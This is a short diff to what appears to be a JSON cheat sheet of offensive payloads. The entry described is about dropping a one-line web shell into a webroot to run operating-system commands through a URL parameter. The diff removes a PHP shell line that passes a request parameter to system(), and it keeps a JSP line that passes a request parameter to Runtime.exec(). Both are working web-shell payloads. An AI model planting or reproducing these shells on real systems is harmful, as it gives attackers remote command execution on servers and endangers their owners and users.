@@ -63,10 +63,6 @@
   "description": "Drop a one-line web shell into the webroot to run OS commands via a URL parameter. Choose the language matching the app (PHP/JSP/ASP).",
   "variations": [
     {
-      "label": "PHP",
-      "command": "<?php system($_REQUEST[\"cmd\"]); ?>"
-    },
-    {
       "label": "JSP",
       "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
     },
